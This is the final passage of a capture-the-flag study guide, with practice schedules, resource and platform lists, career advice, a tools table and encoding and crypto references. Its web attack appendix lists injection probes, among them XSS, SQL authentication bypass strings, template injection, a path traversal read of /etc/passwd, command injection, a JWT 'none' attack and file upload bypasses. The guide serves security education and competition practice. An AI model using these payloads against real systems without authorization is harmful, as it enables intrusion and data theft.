  Sun: Write notes: what tools do what

WEEK 2 — Forensics Basics:
  Mon: picoCTF Forensics: information, Glory of Garden, Matryoshka doll
  Tue: Wireshark install + practice: follow TCP stream on sample PCAP
  Wed: TryHackMe: "OhSINT" room (forensics + OSINT combo)
  Thu: picoCTF: Shark on Wire 1+2 (PCAP challenges)
  Fri: Try Aperisolve on 5 different CTF images
  Sat: Volatility3: install + run pslist on a sample memory dump
  Sun: Write first writeup on GitHub for 2 challenges solved

WEEK 3 — Cryptography Start:
  Mon: CyberChef: decode 10 encoded strings (base64, hex, rot13, binary)
  Tue: dCode.fr: solve a Caesar, ROT13, and Vigenère cipher
  Wed: picoCTF Crypto: caesar, Mod 26, The Numbers, Easy1
  Thu: CryptoHack: "Introduction" section (all challenges)
  Fri: hashcat: crack 10 sample MD5 hashes with rockyou
  Sat: RSA basics: understand n, e, d, try RsaCtfTool
  Sun: picoCTF: Dachshund Attacks, Mind your Ps and Qs

WEEK 4 — Web Basics:
  Mon: Install Burp Suite + set up proxy, intercept first request
  Tue: picoCTF Web: GET aHEAD, Cookies, Inspect HTML
  Wed: TryHackMe: "OWASP Top 10" room
  Thu: SQLi: test on picoCTF "login-bypass" and "SQL Direct"
  Fri: Set up DVWA locally, try SQL injection and XSS
  Sat: PortSwigger: First SQLi lab (apprentice level)
  Sun: PortSwigger: First XSS lab (apprentice level)

MONTH 2: INTERMEDIATE SKILLS
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

WEEK 5 — OSINT:
  Mon: sherlock installation, search 5 usernames across platforms
  Tue: TryHackMe: "Sakura Room" (complete OSINT investigation)
  Wed: Geolocation: solve 3 Sofia Santos OSINT challenges
  Thu: Domain OSINT: full analysis of 2 domains (whois, dig, crt.sh, shodan)
  Fri: Google Dorking: find 5 exposed files using dorks
  Sat: exiftool: find GPS coordinates in 10 sample images
  Sun: Write OSINT writeup for Sakura Room

WEEK 6 — Forensics Intermediate:
  Mon: CyberDefenders: "PacketMaze" challenge
  Tue: HackTheBox: "Illumination" (git forensics)
  Wed: HackTheBox: "Reminiscent" (memory forensics)
  Thu: Volatility3: practice all major plugins on a memory sample
  Fri: Disk forensics: use Autopsy on a sample disk image
  Sat: picoCTF: "Sleuthkit Intro" + "Sleuthkit Apprentice"
  Sun: Write writeup for one memory forensics challenge

WEEK 7 — Crypto Intermediate:
  Mon: CryptoHack: Start "General" section, complete 5 challenges
  Tue: OverTheWire: Krypton levels 1-4 (classical crypto)
  Wed: CryptoHack: XOR challenges (xorknown, xorkeys, etc.)
  Thu: HackTheBox Crypto: "Tempted", "Waiting for Godot"
  Fri: RSA attacks: practice with RsaCtfTool on HackTheBox challenges
  Sat: Hash cracking: crack bcrypt with hashcat, study modes
  Sun: CryptoHack: "Symmetric Cryptography" — first 3 challenges

WEEK 8 — Web Intermediate:
  Mon: PortSwigger: complete 5 more SQLi labs (intermediate tier)
  Tue: PortSwigger: 3 XSS labs (stored + DOM XSS)
  Wed: HackTheBox: "Templated" (SSTI challenge)
  Thu: SSRF: PortSwigger SSRF labs (2-3)
  Fri: JWT attacks: jwt_tool practice, algorithm none attack
  Sat: File upload bypass: try all techniques on a test environment
  Sun: Write 3 web challenge writeups

WEEK 9 — FIRST LIVE CTF:
  Mon-Thu: Review weak areas, practice on picoCTF
  Fri: Find and JOIN a beginner/intermediate CTF on CTFtime
  Sat-Sun: Compete! Aim for 3-5 flags minimum
  After: Write writeups for solved challenges, read others for unsolved

MONTH 3: SOLIDIFYING
━━━━━━━━━━━━━━━━━━━━

WEEK 10-12: Deep practice in your strongest category
  + Participate in 1 more live CTF
  + Start building HTB profile (attempt challenges regularly)
  + Publish 20+ writeups on GitHub

MONTH 4-5: SPECIALIZATION
━━━━━━━━━━━━━━━━━━━━━━━━━━

Choose focus area:
  Forensics/DFIR: CyberDefenders + Volatility + Autopsy certification
  Cryptography:   Complete CryptoHack + study cryptopals
  Web Security:   Complete PortSwigger Academy + BSCP exam prep
  OSINT:          Trace Labs competitions + advanced geolocation

MONTH 6: CAREER READY
━━━━━━━━━━━━━━━━━━━━━━

  → 30+ GitHub writeups published
  → HTB Pro Hacker rank achieved (or close)
  → Participated in 5+ live CTFs
  → Specialist in 1-2 categories
  → LinkedIn updated with profile + achievements
  → Start applying for: Security Analyst, SOC, Junior Pentester roles
```

---

# Chapter 43: All-Topic Master Practice Schedule {#ch43}

## 43.1 Topic Completion → What to Practice Next

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
MASTER PRACTICE SCHEDULE BY TOPIC
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

AFTER COMPLETING FORENSICS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━
Easy (do first):
  1. picoCTF Forensics:              https://play.picoctf.org/practice?category=4
  2. CTFlearn Forensics 1-2★:        https://ctflearn.com/challenge/browse?category=Forensics
  3. TryHackMe "OhSINT":            https://tryhackme.com/room/ohsint

Intermediate:
  4. HackTheBox Forensics Easy:      https://app.hackthebox.com/challenges?category=forensics
  5. CyberDefenders Labs:            https://cyberdefenders.org/blueteam-ctf-challenges/
  6. BlueteamLabs Online:            https://blueteamlabs.online/home/challenges
  7. TryHackMe Forensics Path:       https://tryhackme.com/room/forensics

Advanced:
  8. CTFtime Forensics Writeups:     https://ctftime.org/writeups?tags=forensics
  9. Volatility memory samples:      https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples
 10. National Cyber League:          https://nationalcyberleague.org/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
AFTER COMPLETING OSINT:
━━━━━━━━━━━━━━━━━━━━━━━
Easy:
  1. TryHackMe "OhSINT":            https://tryhackme.com/room/ohsint
  2. TryHackMe "Sakura Room":        https://tryhackme.com/room/sakura
  3. TryHackMe "Google Dorking":     https://tryhackme.com/room/googledorking
  4. GeoGuessr daily (geo practice): https://www.geoguessr.com/

Intermediate:
  5. Sofia Santos OSINT Exercises:   https://gralhix.com/list-of-osint-exercises/
  6. TryHackMe "Searchlight IMINT":  https://tryhackme.com/room/searchlightosint
  7. CTFlearn OSINT category:        https://ctflearn.com/challenge/browse?category=OSINT
  8. NahamCon CTF OSINT archives:    https://ctftime.org/ (search NahamCon writeups)

Advanced:
  9. Trace Labs OSINT CTF:          https://www.tracelabs.org/
 10. Bellingcat OSINT Techniques:    https://www.bellingcat.com/
 11. OSINT Curious Community:        https://osintcurio.us/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
AFTER COMPLETING CRYPTOGRAPHY:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Easy:
  1. picoCTF Crypto:                 https://play.picoctf.org/practice?category=2
  2. CyberChef practice:             https://gchq.github.io/CyberChef/
  3. CTFlearn Crypto 1-2★:           https://ctflearn.com/challenge/browse?category=Cryptography
  4. OverTheWire Krypton:            https://overthewire.org/wargames/krypton/

Intermediate:
  5. CryptoHack (THE crypto platform):https://cryptohack.org/
     → Introduction → General → Symmetric → RSA in order
  6. HackTheBox Crypto Easy:         https://app.hackthebox.com/challenges?category=crypto
  7. CTFlearn Crypto 3-4★:           https://ctflearn.com/challenge/browse?category=Cryptography

Advanced:
  8. Cryptopals challenges:          https://cryptopals.com/
  9. CryptoCTF archived:             https://cr.yp.toc.tf/
 10. CTFtime Crypto writeups:        https://ctftime.org/writeups?tags=crypto
 11. Google CTF Crypto archives:     https://capturetheflag.withgoogle.com/archive

Expert:
 12. Dan Boneh crypto course:        https://www.coursera.org/learn/crypto
 13. Angstrom CTF Crypto:            https://angstromctf.com/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
AFTER COMPLETING WEB EXPLOITATION:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Easy:
  1. picoCTF Web:                    https://play.picoctf.org/practice?category=1
  2. TryHackMe OWASP Top 10:         https://tryhackme.com/room/owasptop10
  3. DVWA (local):                   https://github.com/digininja/DVWA
  4. WebGoat (local):                https://github.com/WebGoat/WebGoat

Intermediate:
  5. PortSwigger Web Academy:        https://portswigger.net/web-security ← DO THIS!
     Complete Apprentice tier for: SQLi, XSS, SSRF, XXE, File Upload,
     Authentication, Access Control, SSTI, Path Traversal (9 topics)
  6. HackTheBox Web Easy:            https://app.hackthebox.com/challenges?category=web
  7. OverTheWire Natas:              https://overthewire.org/wargames/natas/
  8. CTFlearn Web category:          https://ctflearn.com/challenge/browse?category=Web

Advanced:
  9. PortSwigger Practitioner tier:  https://portswigger.net/web-security
 10. HackTheBox Web Medium/Hard:     https://app.hackthebox.com/challenges?category=web
 11. intigriti Monthly XSS:          https://challenge.intigriti.io/
 12. CTFtime Web writeups:           https://ctftime.org/writeups?tags=web

Expert:
 13. Bug bounty programs:            https://hackerone.com/bug-bounty-programs
 14. BSCP Certification prep:        https://portswigger.net/web-security/certification
 15. OWASP Testing Guide:            https://owasp.org/www-project-web-security-testing-guide/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
AFTER COMPLETING MISCELLANEOUS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Easy:
  1. picoCTF General Skills:         https://play.picoctf.org/practice?category=6
  2. OverTheWire Bandit:             https://overthewire.org/wargames/bandit/
     (34 levels, MUST DO for Linux skills)
  3. CTFlearn Misc 1-2★:             https://ctflearn.com/challenge/browse?category=Miscellaneous

Intermediate:
  4. HackTheBox Misc Easy:           https://app.hackthebox.com/challenges?category=misc
  5. pwn.college System Security:    https://pwn.college/
  6. Cryptopals (programming+crypto):https://cryptopals.com/

Advanced:
  7. CTFtime Misc writeups:          https://ctftime.org/writeups?tags=misc
  8. Project Euler (math+programming):https://projecteuler.net/

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
COMPLETE ALL TOPICS → LIVE CTF COMPETITION LINKS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Find upcoming events: https://ctftime.org/event/list/upcoming

BEGINNER-FRIENDLY LIVE CTFs (join these first!):
  picoCTF (annual March):            https://picoctf.org/
  CSAW CTF (annual September):       https://ctf.csaw.io/
  Angstrom CTF (annual spring):      https://angstromctf.com/
  NahamCon CTF (annual):             https://www.nahamcon.com/
  HTB Cyber Apocalypse (annual):     https://hackthebox.com/
  TryHackMe Advent of Cyber (Dec):   https://tryhackme.com/
  CTF.US (beginner):                 https://ctf.us/

INTERMEDIATE LIVE CTFs:
  DiceCTF                            https://ctftime.org/ (search DiceCTF)
  LACTF (UCLA)                       https://lactf.uclaacm.com/
  b01lers CTF (Purdue)               https://ctftime.org/
  UofTCTF                            https://ctftime.org/
  WolvCTF (Michigan)                 https://ctftime.org/
  UIUCTF                             https://ctftime.org/

ADVANCED LIVE CTFs:
  plaidCTF (CMU)                     https://plaidctf.com/
  Google CTF                         https://capturetheflag.withgoogle.com/
  CryptoCTF                          https://cr.yp.toc.tf/
  DragonCTF                          https://ctftime.org/
  0CTF/TCTF (China)                  https://ctftime.org/
  DEF CON CTF Quals                  https://ctftime.org/

OSINT-SPECIFIC LIVE CTFs:
  Trace Labs Search Party            https://www.tracelabs.org/initiatives/search-party
  Sofia Santos OSINT CTF             https://gralhix.com/
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# Chapter 44: Building Your CTF Career Portfolio {#ch44}

## 44.1 The Portfolio That Gets You Hired

```
WHAT RECRUITERS LOOK FOR (most important first):

1. GITHUB PROFILE WITH CTF WRITEUPS
   ─────────────────────────────────
   Create: github.com/USERNAME/ctf-writeups
   Structure:
   ctf-writeups/
   ├── README.md          ← Your overview + skills
   ├── 2024/
   │   ├── picoctf/
   │   │   ├── forensics/
   │   │   │   └── matryoshka-doll.md
   │   │   └── crypto/
   │   │       └── caesar.md
   │   └── hackthebox/
   │       └── web/
   │           └── looking-glass.md
   └── tools/
       └── my_ctf_helpers.py

   30+ writeups = very impressive to recruiters
   Even "easy" challenges: the METHODOLOGY in your writeup matters!

   WRITEUP TEMPLATE:
   ─────────────────
   # Challenge Name — [Category] — [CTF Name]
   **Points:** 200 | **Solves:** 47 | **Difficulty:** Medium

   ## Challenge Description
   [Copy original]

   ## Initial Analysis
   What I noticed immediately.

   ## Solution Process
   Step 1: Ran file + strings → noticed [X]
   Step 2: Tried [tool] because [reason] → found [result]
   Step 3: Applied [technique] → got flag!

   ## Solve Script/Commands
   [Annotated code]

   ## Flag
   `CTF{the_flag_here}`

   ## What I Learned
   New technique: [X] is useful when [Y condition]

2. HACKTHEBOX PROFILE (most recognized platform)
   ───────────────────────────────────────────────
   https://app.hackthebox.com/profile/USERNAME
   Make public! Enable in settings.

   RANK PROGRESSION (what they mean to employers):
   Script Kiddie → Hacker → Pro Hacker → Elite Hacker → Omniscient
   → "Pro Hacker" = employers actively reach out
   → "Elite Hacker" = top tier, very sought after

   HOW TO LEVEL UP QUICKLY:
   → Focus on CHALLENGES (not just machines)
   → Challenges are faster and cover all categories
   → Aim for: 5-10 challenges per week across all categories

3. CRYPTOHACK PROFILE
   ────────────────────
   https://cryptohack.org/user/USERNAME
   Visible completion stats per section.
   "Intro to CryptoHack" completion = solid credential.

4. CTFTIME PROFILE + TEAM
   ────────────────────────
   https://ctftime.org/user/YOUR_ID
   Join or form a team (even solo "team")
   Compete in events → appears in public history
   "Competed in top 100 in [Major CTF]" is a strong talking point.

5. LINKEDIN
   ─────────
   Headline: "CTF Player | HTB Pro Hacker | Web Security Specialist"
   Skills to add: Wireshark, Burp Suite, Ghidra, pwntools, Volatility3,
                  SQLi, XSS, Cryptanalysis, OSINT, Digital Forensics
   Projects: "50+ CTF challenges solved (see GitHub)"
   Certifications: add THM certs, HTB achievements

JOB TITLES TO TARGET WITH THESE SKILLS:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Entry Level (0-2 years experience):
  → Security Analyst
  → SOC Analyst Tier 1/2
  → DFIR Analyst (Digital Forensics & Incident Response)
  → Threat Intelligence Analyst
  → Junior Penetration Tester
  → Security Operations Center Analyst

Mid Level (2-5 years):
  → Penetration Tester
  → Malware Analyst
  → Red Team Analyst
  → Security Engineer
  → Threat Hunter

Senior (5+ years):
  → Senior Security Engineer
  → Principal Penetration Tester
  → Vulnerability Researcher
  → Red Team Lead

CERTIFICATIONS TO PAIR WITH CTF:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Entry level:
  CompTIA Security+: https://www.comptia.org/certifications/security
  eJPT (Junior Pen Test): https://ine.com/certifications/ejpt-certification

Mid level:
  OSCP: https://www.offensive-security.com/pwk-oscp/ (penetration testing GOLD)
  BSCP: https://portswigger.net/web-security/certification (web security)
  GREM: https://www.giac.org/certifications/reverse-engineering-malware-grem/ (malware)

Forensics:
  GCFE: https://www.giac.org/certifications/certified-forensic-examiner-gcfe/
  CCE: https://www.isfce.com/certification.htm

WHERE TO APPLY:
  LinkedIn (set job alerts: "Security Analyst" + "CTF" + "DFIR")
  Indeed, Glassdoor
  USAJOBS.gov (US Government — RE skills in very high demand!)
  Direct: CrowdStrike, Palo Alto Networks, Mandiant, SentinelOne
  Bug bounty (income while building): HackerOne, Bugcrowd
```

---

# Appendix A: All Tools by Category {#appa}

```
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
FORENSICS:
Tool             Install                   Purpose
────             ───────                   ───────
binwalk          apt install binwalk        File analysis + extraction
steghide         apt install steghide       JPEG/BMP/WAV steganography
stegseek         github binary              Fast steghide bruteforce
zsteg            gem install zsteg          PNG/BMP LSB steganography
exiftool         apt install exiftool       Metadata extraction
stegoveritas     pip3 install stegoveritas  Comprehensive auto-analysis
foremost         apt install foremost       File carving
wireshark        apt install wireshark      PCAP analysis (GUI)
tshark           apt install tshark         PCAP analysis (CLI)
volatility3      pip3 install volatility3   Memory forensics
autopsy          apt install autopsy        Digital forensics GUI
sleuthkit        apt install sleuthkit      Filesystem forensics
zbarimg          apt install zbar-tools     QR/barcode decoder
sonic-visualiser apt install sonic-visualiser Audio spectrogram
strings          built-in                   Extract text from binary
file             built-in                   File type detection
pngcheck         apt install pngcheck       PNG validation

OSINT:
sherlock         pip3 install sherlock-project  Username search (400+ sites)
theHarvester     pip3 install theHarvester   Email/subdomain harvesting
whois            apt install whois           Domain registration
dig              apt install dnsutils        DNS records
curl/wget        built-in                    HTTP requests
gobuster         apt install gobuster        Subdomain enumeration
exiftool         apt install exiftool        Photo metadata/GPS

CRYPTOGRAPHY:
hashcat          apt install hashcat         GPU hash cracking
john             apt install john            CPU hash cracking
openssl          apt install openssl         Crypto operations
sagemath         apt install sagemath        Mathematical crypto (SageMath)
RsaCtfTool       github (python)             RSA attacks (--attack all!)
owiener          pip3 install owiener        Wiener's attack
pycryptodome     pip3 install pycryptodome   Python crypto library
z3-solver        pip3 install z3-solver      Constraint/math solving
CyberChef        web: gchq.github.io         Universal encoding/decoding

WEB:
burpsuite        apt install burpsuite       Web proxy (intercept/modify)
sqlmap           apt install sqlmap          SQL injection automation
gobuster         apt install gobuster        Directory/file bruteforce
ffuf             apt install ffuf            Fast web fuzzer
nikto            apt install nikto           Web vulnerability scanner
dirsearch        pip3 install dirsearch      Directory search
jwt_tool         github (python)             JWT attacks
curl             built-in                    HTTP client

GENERAL:
python3          apt install python3         Scripting everything
pwntools         pip3 install pwntools       CTF automation framework
tmux             apt install tmux            Terminal multiplexer
CyberChef        gchq.github.io/CyberChef   Universal tool (USE FIRST!)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# Appendix B: Encoding Quick Reference {#appb}

```
RECOGNIZE ENCODING AT A GLANCE:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
ENCODING    CHARACTERS USED       DECODE COMMAND
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
Base64      A-Za-z0-9+/= (4n len) echo "..." | base64 -d
Base32      A-Z 2-7 = (8n len)    echo "..." | base32 -d
Hex         0-9 a-f only          echo "..." | xxd -r -p
Binary      Only 0 and 1          python3 decode (see ch25)
Octal       Digits 0-7            python3 (int(x,8))
Decimal     Numbers 32-126        python3 (chr(int(n)))
ROT13       Letters shifted 13    python3 codecs rot_13
URL encoded %XX hex codes         python3 urllib.parse.unquote
HTML entity &lt; &amp; &#65;     python3 html.unescape
Morse       . - and spaces        dCode.fr or Python decoder
NATO        Alpha Bravo Charlie   Word → First letter
Wingdings   □ symbols             Change font to Wingdings
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

MULTI-LAYER DECODING:
Many CTF challenges STACK encodings!
"base64 of hex of rot13 of the flag"
SOLUTION: CyberChef "Magic" handles this automatically!
https://gchq.github.io/CyberChef/#recipe=Magic()
```

---

# Appendix C: Crypto Math Quick Reference {#appc}

```python
#!/usr/bin/env python3
"""All essential crypto math — copy these when needed"""

# Modular arithmetic:
pow(2, 10, 1000)          # 2^10 mod 1000 = 24 (fast!)
pow(7, -1, 26)            # Modular inverse: 7^-1 mod 26 (Python 3.8+)
from math import gcd
gcd(1234, 5678)            # GCD

# Extended GCD (Bezout's theorem):
def extended_gcd(a, b):
    if a == 0: return b, 0, 1
    g, x, y = extended_gcd(b%a, a)
    return g, y-(b//a)*x, x

# Chinese Remainder Theorem:
def crt(remainders, moduli):
    M = 1
    for m in moduli: M *= m
    result = 0
    for r, m in zip(remainders, moduli):
        Mi = M // m
        result += r * Mi * pow(Mi, -1, m)
    return result % M
# x ≡ 2 (mod 3), x ≡ 3 (mod 5), x ≡ 2 (mod 7):
print(crt([2,3,2],[3,5,7]))  # 23

# RSA decrypt (when you have p and q):
def rsa_decrypt(c, p, q, e):
    d = pow(e, -1, (p-1)*(q-1))
    return pow(c, d, p*q)

def int_to_text(n):
    h = hex(n)[2:]
    if len(h)%2: h = '0'+h
    return bytes.fromhex(h).decode('utf-8', errors='replace')

# XOR operations:
def xor_bytes(a, b): return bytes(x^y for x,y in zip(a,b))

# Frequency analysis:
from collections import Counter
def freq_analysis(text):
    letters = [c.lower() for c in text if c.isalpha()]
    return Counter(letters).most_common()
# English: e t a o i n s h r d l c u m w f g y p b v k j x q z

# Integer nth root:
from math import isqrt
def iroot(k, n):
    u, s = n, n+1
    while u < s:
        s = u
        t = (k-1)*s + n//pow(s,k-1)
        u = t//k
    return s
# iroot(3, 8) → 2 (cube root of 8)
```

---

# Appendix D: Web Attack Quick Reference {#appd}

```
INJECT THESE INTO EVERY INPUT (30-second scan):
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
SQL:        '    (quote → error = SQLi)
XSS:        <script>alert(1)</script>
            <img src=x onerror=alert(1)>
SSTI:       {{7*7}}   ${7*7}   #{7*7}
LFI:        ../../../../etc/passwd
CMD:        ; id    | id    $(id)    `id`
SSRF:       (URL params) http://127.0.0.1/

SQL AUTHENTICATION BYPASS:
  admin'-- -                  (comment out password)
  ' OR '1'='1'-- -            (always true)
  ' OR 1=1-- -

HTTP METHODS TO TRY:
  GET → POST → PUT → DELETE → OPTIONS → HEAD → PATCH

COMMON HIDDEN ENDPOINTS:
  /robots.txt  /sitemap.xml  /.git  /admin  /api
  /dashboard   /flag         /backup  /.env  /config.php
  /phpinfo.php /wp-admin     /wp-login.php

JWT ATTACKS QUICK:
  1. Decode: jwt.io
  2. Change alg to "none", remove signature
  3. Brute force: hashcat -a 0 -m 16500 TOKEN rockyou.txt

COOKIE MANIPULATION:
  admin=false → admin=true
  role=user → role=admin
  Base64 decode → modify → re-encode → send

FILE UPLOAD BYPASS:
  .php → .phtml  .php5  .pHp
  Change Content-Type to image/jpeg
  Prepend GIF89a; to PHP code
  Upload .htaccess: AddType application/x-httpd-php .jpg
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
```

---

# Appendix E: Master Resource Links {#appe}

```
╔══════════════════════════════════════════════════════════════════════╗
║  THE MASTER RESOURCE LIST — BOOKMARK ALL OF THESE                    ║
╚══════════════════════════════════════════════════════════════════════╝

🏆 CTF PLATFORMS (all free):
  picoCTF:          https://picoctf.org/
  TryHackMe:        https://tryhackme.com/
  HackTheBox:       https://app.hackthebox.com/
  CTFtime:          https://ctftime.org/
  CTFlearn:         https://ctflearn.com/
  CryptoHack:       https://cryptohack.org/
  OverTheWire:      https://overthewire.org/wargames/
  pwn.college:      https://pwn.college/
  ROPemporium:      https://ropemporium.com/
  CyberDefenders:   https://cyberdefenders.org/
  BlueteamLabs:     https://blueteamlabs.online/
  ImaginaryCTF:     https://imaginaryctf.org/
  PortSwigger:      https://portswigger.net/web-security
  Cryptopals:       https://cryptopals.com/
  Trace Labs:       https://www.tracelabs.org/
  pwnable.kr:       http://pwnable.kr/

🔧 TOOLS (online, no install):
  CyberChef:        https://gchq.github.io/CyberChef/  ← USE THIS FIRST
  dCode.fr:         https://www.dcode.fr/
  CrackStation:     https://crackstation.net/
  HackTricks:       https://book.hacktricks.xyz/
  jwt.io:           https://jwt.io/
  FactorDB:         http://factordb.com/
  QuipQuip:         https://quipqiup.com/
  Aperisolve:       https://www.aperisolve.com/
  FotoForensics:    https://fotoforensics.com/

🔍 OSINT TOOLS:
  Shodan:           https://www.shodan.io/
  crt.sh:           https://crt.sh/
  Wayback Machine:  https://web.archive.org/
  HIBP:             https://haveibeenpwned.com/
  WhatsMyName:      https://whatsmyname.app/
  GeoHints:         https://geohints.com/
  Google Dorks DB:  https://www.exploit-db.com/google-hacking-database

📚 LEARNING:
  0xdf writeups:    https://0xdf.gitlab.io/
  LiveOverflow:     https://www.youtube.com/@LiveOverflow
  John Hammond:     https://www.youtube.com/@_JohnHammond
  IppSec:           https://www.youtube.com/@ippsec
  CTFtime writeups: https://ctftime.org/writeups
  PayloadsAllThings:https://github.com/swisskyrepo/PayloadsAllTheThings
  GTFOBins:         https://gtfobins.github.io/

📖 REFERENCE:
  OWASP Top 10:     https://owasp.org/www-project-top-ten/
  Cipher identifier:https://www.dcode.fr/cipher-identifier
  Hash identifier:  https://hashes.com/en/tools/hash_identifier
  RSA attack tool:  https://github.com/RsaCtfTool/RsaCtfTool

---

*This CTF Bible is for ethical use in competitions, authorized testing, and security education.*
*CTF skills translate directly to defending real systems — understanding attacks makes better defenders.*
*Always compete ethically. Never attack systems without permission.*

```

```
  ██████╗████████╗███████╗    ██████╗ ██╗██████╗ ██╗     ███████╗
 ██╔════╝╚══██╔══╝██╔════╝    ██╔══██╗██║██╔══██╗██║     ██╔════╝
 ██║        ██║   █████╗      ██████╔╝██║██████╔╝██║     █████╗
 ██║        ██║   ██╔══╝      ██╔══██╗██║██╔══██╗██║     ██╔══╝
 ╚██████╗   ██║   ██║         ██████╔╝██║██████╔╝███████╗███████╗
  ╚═════╝   ╚═╝   ╚═╝         ╚═════╝ ╚═╝╚═════╝ ╚══════╝╚══════╝

 THE COMPLETE CTF BIBLE — FINAL EDITION
 Forensics | OSINT | Cryptography | Web | Miscellaneous
 Beginner → Pro | Theory + Practice + Career
 Chapters 0–44 + Appendices A–E
 With Topic-by-Topic Free Practice Links: Easy → Hard
```

*End of The Complete CTF Bible*
